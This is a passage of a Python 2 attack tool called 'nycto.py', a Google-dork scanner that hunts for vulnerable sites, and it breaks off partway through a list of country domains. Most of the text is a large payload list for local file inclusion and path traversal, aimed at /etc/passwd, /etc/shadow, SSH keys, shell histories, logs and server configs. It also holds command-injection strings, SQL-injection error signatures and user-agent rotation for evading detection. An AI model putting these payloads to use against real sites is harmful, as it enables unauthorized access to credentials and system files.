#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# 
# Toolname        : nycto.py
# Coder           : NYCTO
# Re-written by   : ^^^^^^^^
# Version         : 0.5
#  

import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
from random import choice

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";


# Banner
def logo():
	print G+"\n                                                                  "
        print "    =                      -nycto-d0rK-Scanner-                   =     "
        print "   =                         DORKABLE HACKS                         =    "  
        print "  =                                                                  =   "
        print "||                          Written By Nycto                             ||"
        print "                       nycto+hackerone@keemail.me                        "
        print "========================================================================\n"
	print G

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()
  
else:
  subprocess.call("cls", shell=True)
  logo()
  
log = "Nycto-check.txt"
logfile = open(log, "a")
lfi_log = "Nycto-dOrk-lfi.txt"
lfi_log_file = open(lfi_log, "a")
threads = []
finallist = []
vuln = []
timeout = 350
socket.setdefaulttimeout(timeout)



           
lfis = ["/etc/passwd%00",
"../etc/passwd%00",
"../../etc/passwd%00",
"../../../etc/passwd%00",
"../../../../etc/passwd%00",
"../../../../../etc/passwd%00",
"../../../../../../etc/passwd%00",
"../../../../../../../etc/passwd%00",
"../../../../../../../../etc/passwd%00",
"../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../../../../etc/passwd%00",
"/etc/passwd",
"../etc/passwd",
"../../etc/passwd",
"../../../etc/passwd",
"../../../../etc/passwd",
"../../../../../etc/passwd",
"../../../../../../etc/passwd",
"../../../../../../../etc/passwd",
"../../../../../../../../etc/passwd",
"../../../../../../../../../etc/passwd",
"../../../../../../../../../../etc/passwd",
"../../../../../../../../../../../etc/passwd",
"../../../../../../../../../../../../etc/passwd",
"../../../../../../../../../../../../../etc/passwd""%00../../../../../../etc/passwd",
"%00../../../../../../etc/shadow",
"%00/etc/passwd%00",
"%00/etc/shadow%00",
"%0a/bin/cat%20/etc/passwd",
"%0a/bin/cat%20/etc/shadow",
"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini",
"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00",
"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00",
"..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini",
"../../../../../../../../../../../../boot.ini",
"../../../../../../../../../../../../boot.ini%00",
"../../../../../../../../../../../../etc/hosts",
"../../../../../../../../../../../../etc/hosts%00",
"../../../../../../../../../../../../etc/passwd",
"../../../../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../../../etc/shadow",
"../../../../../../../../../../../../etc/shadow%00",
"../../../../../../../../../../../../localstart.asp",
"../../../../../../../../../../../../localstart.asp%00",
"../../../../../../../../conf/server.xml",
"../../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../var/log/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/error_log",
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../../../../../var/www/logs/access.log",
"../../../../../var/www/logs/error.log",
"../../../../../var/www/logs/error_log",
"../../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../logs/access.log",
"../../../../logs/error.log",
"../../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../logs/access.log",
"../../../logs/error.log",
"../../apache/logs/access.log",
"../../apache/logs/error.log",
"../../boot.ini",
"../../logs/access.log",
"../../logs/error.log",
"../apache/logs/access.log",
"../apache/logs/error.log",
"../logs/access.log",
"../logs/error.log",
"..\..\..\..\..\..\..\..\..\..boot.ini",
"..\..\..\..\..\..\..\..\..\..boot.ini%00",
"..\..\..\..\..\..\..\..\..\..\etc\passwd",
"..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
"..\..\..\..\..\..\..\..\..\..\etc\shadow",
"..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
".\./.\./../.\./../.\./etc/passwd",
".\./.\/.\./.\./../../etc/shadow",
"/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00",
"/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini",
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
"/.../.../.../.../.../",
"/../../../../../../../../%2A",
"/../../../../../../../../../../../boot.ini",
"/../../../../../../../../../../../boot.ini%00",
"/../../../../../../../../../../../boot.ini%00.html",
"/../../../../../../../../../../../boot.ini%00.jpg",
"/../../../../../../../../../../../etc/passwd%00.html",
"/../../../../../../../../../../../etc/passwd%00.jpg",
"/../../../../../../../../../../etc/passwd",
"/../../../../../../../../../../etc/passwd^^",
"/../../../../../../../../../../etc/shadow",
"/../../../../../../../../../../etc/shadow^^",
"/../../../../../../../../bin/id|",
"/../../var/www/logs/access_log",
"/..\../..\../..\../..\../..\../..\../boot.ini",
"/..\../..\../..\../..\../..\../..\../etc/passwd",
"/..\../..\../..\../..\../..\../..\../etc/shadow",
"/./././././././././././boot.ini",
"/./././././././././././etc/passwd",
"/./././././././././././etc/shadow",
"/.\./../.\./.\./.\./.\./boot.ini",
"/NetServer/bin\stable/apache\php.ini",
"/PHP\php.ini",
"/Program Files\Apache Group\Apache2\conf\httpd.conf",
"/Program Files\Apache Group\Apache\conf\httpd.conf",
"/Program Files\Apache Group\Apache\logs/access.log",
"/Program Files\Apache Group\Apache\logs\error.log",
"/Program Files/xampp/apache\conf\httpd.conf",
"/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf",
"/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf",
"/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf",
"/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php",
"/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini",
"/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php",
"/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php",
"/Volumes/webBackup/opt/apache2/conf/httpd.conf",
"/Volumes/webBackup/private/etc/httpd/httpd.conf",
"/Volumes/webBackup/private/etc/httpd/httpd.conf.default",
"/WINDOWS\php.ini",
"/WINNT\php.ini",
"/apache/logs/access.log",
"/apache/logs/error.log",
"/apache2/logs/access.log",
"/apache2/logs/error.log",
"/apache\php\php.ini",
"/bin/php.ini",
"/etc/apache/apache.conf",
"/etc/apache/conf/httpd.conf",
"/etc/apache/httpd.conf",
"/etc/apache2/apache2.conf",
"/etc/apache2/conf/httpd.conf",
"/etc/apache2/httpd.conf",
"/etc/apache2/sites-available/default",
"/etc/apache2/vhosts.d/default_vhost.include",
"/etc/chrootUsers",
"/etc/ftpchroot",
"/etc/ftphosts",
"/etc/group",
"/etc/http/conf/httpd.conf",
"/etc/http/httpd.conf",
"/etc/httpd.conf",
"/etc/httpd/conf/httpd.conf",
"/etc/httpd/httpd.conf",
"/etc/httpd/logs/acces.log",
"/etc/httpd/logs/acces_log",
"/etc/httpd/logs/access.log",
"/etc/httpd/logs/access_log",
"/etc/httpd/logs/error.log",
"/etc/httpd/logs/error_log",
"/etc/httpd/php.ini",
"/etc/init.d/apache",
"/etc/init.d/apache2",
"/etc/logrotate.d/ftp",
"/etc/logrotate.d/proftpd",
"/etc/logrotate.d/vsftpd.log",
"/etc/mail/access",
"/etc/my.cnf",
"/etc/mysql/my.cnf",
"/etc/php.ini",
"/etc/php/apache/php.ini",
"/etc/php/apache2/php.ini",
"/etc/php/cgi/php.ini",
"/etc/php/php.ini",
"/etc/php/php4/php.ini",
"/etc/php4.4/fcgi/php.ini",
"/etc/php4/apache/php.ini",
"/etc/php4/apache2/php.ini",
"/etc/php4/cgi/php.ini",
"/etc/php5/apache/php.ini",
"/etc/php5/apache2/php.ini",
"/etc/php5/cgi/php.ini",
"/etc/proftp.conf",
"/etc/proftpd/modules.conf",
"/etc/protpd/proftpd.conf",
"/etc/pure-ftpd.conf",
"/etc/pure-ftpd/pure-ftpd.conf",
"/etc/pure-ftpd/pure-ftpd.pdb",
"/etc/pure-ftpd/pureftpd.pdb",
"/etc/pureftpd.passwd",
"/etc/pureftpd.pdb",
"/etc/security/environ",
"/etc/security/failedlogin",
"/etc/security/group",
"/etc/security/lastlog",
"/etc/security/limits",
"/etc/security/passwd",
"/etc/security/user",
"/etc/shadow",
"/etc/utmp",
"/etc/vhcs2/proftpd/proftpd.conf",
"/etc/vsftpd.chroot_list",
"/etc/vsftpd.conf",
"/etc/vsftpd/vsftpd.conf",
"/etc/wtmp",
"/etc/wu-ftpd/ftpaccess",
"/etc/wu-ftpd/ftphosts",
"/etc/wu-ftpd/ftpusers",
"/home/apache/conf/httpd.conf",
"/home/apache/httpd.conf",
"/home2/bin\stable/apache\php.ini",
"/home/bin\stable/apache\php.ini",
"/logs/access.log",
"/logs/error.log",
"/logs/pure-ftpd.log",
"/opt/apache/conf/httpd.conf",
"/opt/apache2/conf/httpd.conf",
"/opt/lampp/logs/access.log",
"/opt/lampp/logs/access_log",
"/opt/lampp/logs/error.log",
"/opt/lampp/logs/error_log",
"/opt/xampp/etc/php.ini",
"/opt/xampp/logs/access.log",
"/opt/xampp/logs/access_log",
"/opt/xampp/logs/error.log",
"/opt/xampp/logs/error_log",
"/php4\php.ini",
"/php5\php.ini",
"/php\php.ini",
"/private/etc/httpd/httpd.conf",
"/private/etc/httpd/httpd.conf.default",
"/proc/self/cmdline",
"/proc/self/envron",
"/root/.Xauthority",
"/root/.bash_history",
"/root/.bash_logut",
"/root/.ksh_history",
"/usr/apache/conf/httpd.conf",
"/usr/apache2/conf/httpd.conf",
"/usr/etc/pure-ftpd.conf",
"/usr/lib/cron/log",
"/usr/lib/php.ini",
"/usr/lib/php/php.ini",
"/usr/lib/security/mkuser.default",
"/usr/local/Zend/etc/php.ini",
"/usr/local/apache/conf/httpd.conf",
"/usr/local/apache/conf/php.ini",
"/usr/local/apache/httpd.conf",
"/usr/local/apache/log",
"/usr/local/apache/logs",
"/usr/local/apache/logs/access. log",
"/usr/local/apache/logs/access.log",
"/usr/local/apache/logs/access_ log",
"/usr/local/apache/logs/access_log",
"/usr/local/apache/logs/error.log",
"/usr/local/apache/logs/error_log",
"/usr/local/apache2/conf/httpd.conf",
"/usr/local/apache2/httpd.conf",
"/usr/local/apache2/logs/access.log",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/error.log",
"/usr/local/apache2/logs/error_log",
"/usr/local/apps/apache/conf/httpd.conf",
"/usr/local/apps/apache2/conf/httpd.conf",
"/usr/local/cpanel/logs",
"/usr/local/cpanel/logs/access_log",
"/usr/local/cpanel/logs/error_log",
"/usr/local/cpanel/logs/license_log",
"/usr/local/cpanel/logs/login_log",
"/usr/local/cpanel/logs/stats_log"
"/usr/local/etc/apache/conf/httpd.conf",
"/usr/local/etc/apache/vhosts.conf",
"/usr/local/etc/apache2/conf/httpd.conf",
"/usr/local/etc/httpd/conf/httpd.conf",
"/usr/local/etc/httpd/logs/access_log",
"/usr/local/etc/httpd/logs/error_log",
"/usr/local/etc/php.ini",
"/usr/local/etc/pure-ftpd.conf",
"/usr/local/etc/pureftpd.pdb",
"/usr/local/httpd/conf/httpd.conf",
"/usr/local/lib/php.ini",
"/usr/local/php/httpd.conf",
"/usr/local/php/httpd.conf.php",
"/usr/local/php/lib/php.ini",
"/usr/local/php4/httpd.conf",
"/usr/local/php4/httpd.conf.php",
"/usr/local/php4/lib/php.ini",
"/usr/local/php5/httpd.conf",
"/usr/local/php5/httpd.conf.php",
"/usr/local/php5/lib/php.ini",
"/usr/local/pureftpd/etc/pure-ftpd.conf",
"/usr/local/pureftpd/etc/pureftpd.pdb",
"/usr/local/pureftpd/sbin/pure-config.pl",
"/usr/local/www/logs/thttpd_log",
"/usr/pkgsrc/net/pureftpd/",
"/usr/ports/contrib/pure-ftpd/",
"/usr/ports/ftp/pure-ftpd/",
"/usr/ports/net/pure-ftpd/",
"/usr/sbin/pure-config.pl",
"/usr/spool/lp/log",
"/usr/spool/mqueue/syslog",
"/var/adm",
"/var/adm/SYSLOG",
"/var/adm/X0msgs",
"/var/adm/acct/sum/loginlog",
"/var/adm/aculog",
"/var/adm/aculogs",
"/var/adm/crash/unix",
"/var/adm/crash/vmcore",
"/var/adm/cron/log",
"/var/adm/dtmp",
"/var/adm/lastlog/username",
"/var/adm/log/asppp.log",
"/var/adm/log/xferlog",
"/var/adm/loginlog",
"/var/adm/lp/lpd-errs",
"/var/adm/messages",
"/var/adm/pacct",
"/var/adm/qacct",
"/var/adm/ras/bootlog",
"/var/adm/ras/errlog",
"/var/adm/sulog",
"/var/adm/utmp",
"/var/adm/utmpx",
"/var/adm/vold.log",
"/var/adm/wtmp",
"/var/adm/wtmpx",
"/var/apache/log",
"/var/apache/logs",
"/var/apache/logs/access_log",
"/var/apache/logs/error_log",
"/var/cpanel/cpanel.config",
"/var/cron/log",
"/var/lib/mysql/my.cnf",
"/var/local/www/conf/php.ini",
"/var/lock/samba",
"/var/log",
"/var/log/POPlog",
"/var/log/access.log",
"/var/log/access_log",
"/var/log/acct",
"/var/log/apache-ssl/access.log",
"/var/log/apache-ssl/error.log",
"/var/log/apache/access.log",
"/var/log/apache/access_log",
"/var/log/apache/error.log",
"/var/log/apache/error_log",
"/var/log/apache2/access.log",
"/var/log/apache2/access_log",
"/var/log/apache2/error.log",
"/var/log/apache2/error_log",
"/var/log/auth",
"/var/log/auth.log",
"/var/log/authlog",
"/var/log/boot.log",
"/var/log/cron.log",
"/var/log/error.log",
"/var/log/error_log",
"/var/log/exim/mainlog",
"/var/log/exim/paniclog",
"/var/log/exim/rejectlog",
"/var/log/exim_mainlog",
"/var/log/exim_paniclog",
"/var/log/exim_rejectlog",
"/var/log/ftp-proxy",
"/var/log/ftp-proxy/ftp-proxy.log",
"/var/log/ftplog",
"/var/log/httpd/",
"/var/log/httpd/access.log",
"/var/log/httpd/access_log",
"/var/log/httpd/error.log",
"/var/log/httpd/error_log",
"/var/log/httpsd/ssl.access_log",
"/var/log/httpsd/ssl_log",
"/var/log/kern.log",
"/var/log/lastlog",
"/var/log/lighttpd",
"/var/log/maillog",
"/var/log/message",
"/var/log/messages",
"/var/log/mysql.log",
"/var/log/mysql/mysql-bin.log",
"/var/log/mysql/mysql-slow.log",
"/var/log/mysql/mysql.log",
"/var/log/mysqld.log",
"/var/log/mysqlderror.log",
"/var/log/ncftpd.errs",
"/var/log/ncftpd/misclog.txt",
"/var/log/news",
"/var/log/news.all",
"/var/log/news/news",
"/var/log/news/news.all",
"/var/log/news/news.crit",
"/var/log/news/news.err",
"/var/log/news/news.notice",
"/var/log/news/suck.err",
"/var/log/news/suck.notice",
"/var/log/poplog",
"/var/log/proftpd",
"/var/log/proftpd.access_log",
"/var/log/proftpd.xferlog",
"/var/log/proftpd/xferlog.legacy",
"/var/log/pure-ftpd/pure-ftpd.log",
"/var/log/pureftpd.log",
"/var/log/qmail",
"/var/log/qmail/",
"/var/log/samba",
"/var/log/samba-log.%m",
"/var/log/secure",
"/var/log/smtpd",
"/var/log/spooler",
"/var/log/syslog",
"/var/log/telnetd",
"/var/log/thttpd_log",
"/var/log/utmp",
"/var/log/vsftpd.log",
"/var/log/wtmp",
"/var/log/xferlog",
"/var/log/yum.log",
"/var/lp/logs/lpNet",
"/var/lp/logs/lpsched",
"/var/lp/logs/requests",
"/var/mysql.log",
"/var/run/utmp",
"/var/saf/_log",
"/var/saf/port/log",
"/var/spool/errors",
"/var/spool/locks",
"/var/spool/logs",
"/var/spool/tmp",
"/var/www/conf/httpd.conf",
"/var/www/html/.htaccess",
"/var/www/localhost/htdocs/.htaccess",
"/var/www/log/access_log",
"/var/www/log/error_log",
"/var/www/logs/access.log",
"/var/www/logs/access_log",
"/var/www/logs/error.log",
"/var/www/logs/error_log",
"/var/www/sitename/htdocs/",
"/var/www/vhosts/sitename/httpdocs/.htaccess",
"/var/www/web1/html/.htaccess",
"/web/conf/php.ini",
"/www/logs/proftpd.system.log",
"/xampp\apache\bin\php.ini",
"C:/boot.ini",
"C:/inetpub/wwwroot/global.asa",
"C:\boot.ini",
"C:\inetpub\wwwroot\global.asa",
"\..\..\..\..\..\..\..\..\..\..\boot.ini",
"\..\..\..\..\..\..\..\..\..\..\etc\passwd",
"\..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
"\..\..\..\..\..\..\..\..\..\..\etc\shadow",
"\..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
"\\&apos;/bin/cat%20/etc/shadow\\&apos;",
"c:\Program Files\Apache Group\Apache\logs\access.log",
"c:\Program Files\Apache Group\Apache\logs\error.log",
"c:\System32\Inetsrv\metabase.xml",
"c:\apache\logs\access.log",
"c:\apache\logs\error.log",
"c:\inetpub\wwwroot\index.asp",
"d:\System32\Inetsrv\metabase.xml",
"/var/log/mysqld.log",
"/etc/passwd",
"/etc/shadow",
"/etc/hosts",
"/etc/hosts.allow",
"/etc/hosts.equiv",
"/etc/hosts.deny",
"/etc/ssh/sshd_config",
"/etc/apache/httpd.conf",
"/etc/resolv.conf",
"/var/log/message",
"/etc/inetd.conf",
"/etc/crontab",
"/etc/defaultdomain",
"/etc/rpc",
"/.rhosts",
"/.shosts",
"/.ssh/authorized_keys",
"/.bash_history",
"/.bash_profile",
"/.sh_history",
"/.profile",
"/.bashrc",
"/.logout",
"/.Xauthority",
"/.netrc",
"/.cshrc",
"/etc/hostname.hme0",
"/etc/hostname.pcn0",
"/etc/hostname.iprb0",
"/etc/hostname.qfe0",
"/etc/hostname.eri0",
"/etc/hostname.bge",
"/etc/hostname.ce0",
"/etc/hostname.dmfe0",
"/etc/hostname.dnet0",
"/etc/hostname.elx0",
"/etc/hostname.elxl0",
"/etc/hostname.spwr0",
"/etc/hostname.eri0",
"/etc/hostname.ge0",
"/etc/hostname.ieef0",
"/etc/hostname.le0",
"/etc/hostname.dcelx0",
"/etc/hostname.ecn0",
"/etc/hostname.lo",
"/etc/hostname.hme1",
"/etc/hostname.pcn1",
"/etc/hostname.iprb1",
"/etc/hostname.qfe1",
"/etc/hostname.eri1",
"/etc/hostname.bge",
"/etc/hostname.ce1",
"/etc/hostname.dmfe1",
"/etc/hostname.dnet1",
"/etc/hostname.elx1",
"/etc/hostname.elxl1",
"/etc/hostname.spwr1",
"/etc/hostname.eri1",
"/etc/hostname.ge1",
"/etc/hostname.ieef1",
"/etc/hostname.le1",
"/etc/hostname.dcelx1",
"/etc/hostname.ecn1",
"/etc/hostname.lo",
"/etc/hostname.hme2",
"/etc/hostname.pcn2",
"/etc/hostname.iprb2",
"/etc/hostname.qfe2",
"/etc/hostname.eri2",
"/etc/hostname.bge",
"/etc/hostname.ce2",
"/etc/hostname.dmfe2",
"/etc/hostname.dnet2",
"/etc/hostname.elx2",
"/etc/hostname.elxl2",
"/etc/hostname.spwr2",
"/etc/hostname.eri2",
"/etc/hostname.ge2",
"/etc/hostname.ieef2",
"/etc/hostname.le2",
"/etc/hostname.dcelx2",
"/etc/hostname.ecn2",
"/etc/hostname.lo",
"/etc/hostname.hme3",
"/etc/hostname.pcn3",
"/etc/hostname.iprb3",
"/etc/hostname.qfe3",
"/etc/hostname.eri3",
"/etc/hostname.bge",
"/etc/hostname.ce3",
"/etc/hostname.dmfe3",
"/etc/hostname.dnet3",
"/etc/hostname.elx3",
"/etc/hostname.elxl3",
"/etc/hostname.spwr3",
"/etc/hostname.eri3",
"/etc/hostname.ge3",
"/etc/hostname.ieef3",
"/etc/hostname.le3",
"/etc/hostname.dcelx3",
"/etc/hostname.ecn3",
"/etc/hostname.lo",
"/etc/default/passwd",
"/etc/syslog.conf",
"/etc/syslogd.conf",
"/etc/release",
"/etc/motd",
"/etc/issue",
"/etc/group",
"/etc/nsswitch.conf",
"/etc/opt/ipf/ipf.conf",
"/etc/opt/ipf/ipnat.conf",
"/etc/vfstab",
"/etc/system",
"/etc/defaultrouter",
"/var/adm/messages",
"/var/log/syslog",
"/var/adm/utmpx",
"/var/adm/loginlog",
"/var/adm/lastlog",
"/etc/netconfig",
"/var/log/authlog",
"/log/miscDir/accesslog",
"/etc/sudoers",
"/etc/httpd/conf/httpd.conf",
"/etc/make.conf",
"/etc/apt/sources.list",
"/etc/passwd",
"/etc/shadow",
"/etc/hosts",
"/etc/hosts.allow",
"/etc/hosts.equiv",
"/etc/hosts.deny",
"/etc/ssh/sshd_config",
"/etc/apache/httpd.conf",
"/etc/resolv.conf",
"/var/log/messages",
"/var/log/dmesg",
"/etc/inetd.conf",
"/etc/crontab",
"/etc/defaultdomain",
"/etc/rpc",
"/.rhosts",
"/.shosts",
"/.ssh/authorized_keys",
"/.bash_history",
"/.bash_profile",
"/.sh_history",
"/.profile",
"/.bashrc",
"/.logout",
"/.Xauthority",
"/.netrc",
"/.forward",
"/.cshrc",
"/etc/default/passwd",
"/etc/syslog.conf",
"/etc/syslogd.conf",
"/etc/release",
"/etc/issue",
"/etc/motd",
"/etc/group",
"/etc/fstab",
"/etc/nsswitch.conf",
"/etc/vfstab",
"/etc/system",
"/var/log/syslog",
"/etc/netconfig",
"/var/log/authlog",
"/log/miscDir/accesslog",
"/etc/sudoers",
"/etc/updatedb.conf",
"/etc/httpd/conf.d/ssl.conf",
"/etc/httpd/conf.d/php.conf",
"/etc/httpd/conf.d/squirrelmail.conf",
"/var/log/httpd/error_log",
"/var/log/httpd/access_log",
"/var/log/apache/error_log",
"/var/log/apache/access_log",
"/var/log/apache2/error_log",
"/var/log/apache2/access_log",
"/etc/logrotate.d/httpd",
"/var/run/httpd.pid",
"/proc/cpuinfo",
"/proc/version",
"/etc/php.ini",
"/etc/php.d/dom.ini",
"/etc/php.d/gd.ini",
"/etc/php.d/imap.ini",
"/etc/php.d/json.ini",
"/etc/php.d/ldap.ini",
"/etc/php.d/mbstring.ini",
"/etc/php.d/mysql.ini",
"/etc/php.d/mysqli.ini",
"/etc/php.d/odbc.ini",
"/etc/php.d/pdo.ini",
"/etc/php.d/pdo_mysql.ini",
"/etc/php.d/pdo_pgsql.ini",
"/etc/php.d/pdo_sqlite.ini",
"/etc/php.d/pgsql.ini",
"/etc/php.d/xmlreader.ini",
"/etc/php.d/xmlwriter.ini",
"/etc/php.d/xsl.ini",
"/etc/php.d/zip.ini",
"/etc/my.cnf",
"/var/run/mysqld/mysqld.pid",
"/var/log/mysqld.log",
"/var/log/httpd/access.log",
"/var/log/httpd/error.log",
"/var/log/httpd/access_log",
"/var/log/httpd/error_log",
"/apache/logs/error_log",
"/apache/logs/access_log",
"/apache/logs/error.log",
"/apache/logs/access.log",
"/logs/error_log",
"/logs/access_log",
"/logs/error.log",
"/logs/access.log",
"/etc/httpd/logs/access_log",
"/etc/httpd/logs/access.log",
"/etc/httpd/logs/error_log",
"/etc/httpd/logs/error.log",
"/usr/local/apache/logs/access_log",
"/usr/local/apache/logs/access.log",
"/usr/local/apache/logs/error_log",
"/usr/local/apache/logs/error.log",
"/var/log/apache/access_log",
"/var/log/apache/access.log",
"/var/log/apache/error_log",
"/var/log/apache/error.log",
"/var/www/logs/access_log",
"/var/www/logs/access.log",
"/var/www/logs/error_log",
"/var/www/logs/error.log",
"/var/log/access_log",
"/var/log/error_log",
"/var/log/access.log",
"/var/log/error.log",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/access.log",
"/usr/local/apache2/logs/error_log",
"/usr/local/apache2/logs/error.log",
"/var/log/apache2/access_log",
"/var/log/apache2/access.log",
"/var/log/apache2/error_log",
"/var/log/apache2/error.log",
"/apache2/logs/error_log",
"/apache2/logs/access_log",
"/apache2/logs/error.log",
"/apache2/logs/access.log",
"/var/lib/mlocate/mlocate.db",
"/proc/meminfo",
"/proc/net/route",
"/proc/net/tcp",
"/proc/net/arp",
"/proc/net/dev",
"/proc/partitions",
"/proc/mounts",
"/proc/loadavg",
"/boot/grub/grub.conf",
"/etc/mailman/mm_cfg.py",
"/etc/postfix/mydomains"]

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}
             

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
      'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]',
      'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' ]
	  
	  
domains = {'All domains':['ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
